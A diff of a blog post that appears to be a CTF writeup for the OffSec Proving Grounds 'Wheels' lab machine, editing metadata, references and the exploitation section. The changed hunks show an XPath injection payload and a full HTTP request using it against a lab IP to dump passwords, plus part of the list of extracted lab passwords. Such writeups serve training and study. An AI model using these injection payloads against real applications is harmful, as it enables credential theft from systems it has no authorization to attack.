@@ -2,18 +2,10 @@
 title: "Proving grounds Play: Wheels"
 layout: post
 date: 2023-10-08 02:00
-tag: 
-- CTF
-- Offsec labs
-- OSCP
-- Writeup
-- Linux
-- PG-Practice
-writeups: true
-hidden: true
-author: Naveen
-description: "Offsec proving grounds practice linux machine writeup"
+categories: writeup
 ---
+
+Proving grounds Practice - Wheels CTF writeup.
 
 ## Nmap
 
@@ -84,12 +76,12 @@ XML Error; No car' entity found<br />
 
 ### Exploitation
 
-Send the payload `')]/password+|+a[contains+(a,'` to extract passwords from the application.
+Send the payload `')]+|+//password%00` to extract passwords from the application.
 
 #### Request
 
 ```text
-GET /portal.php?work=car')]/password+|+a[contains+(a,'&action=search HTTP/1.1
+GET /portal.php?work=car')]+|+//password%00&action=search HTTP/1.1
 Host: 192.168.196.202
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
@@ -138,6 +130,7 @@ john
 Iamrockinginmyroom1212
 iamarabbitholeand7875
 johnloveseverontr8932
+lokieismyfav!@#12
 alreadydead$%^234
 lasagama90809!@
 ```
@@ -240,7 +233,8 @@ root@wheels:~#
 ## References
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XPATH%20Injection/README.md#exploitation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XPATH%20Injection/README.md#exploitation)
+- [https://book.hacktricks.xyz/pentesting-web/xpath-injection#string-extraction](https://book.hacktricks.xyz/pentesting-web/xpath-injection#string-extraction)
 
 Thanks for reading!
 
-For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).
+For more updates and insights, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).
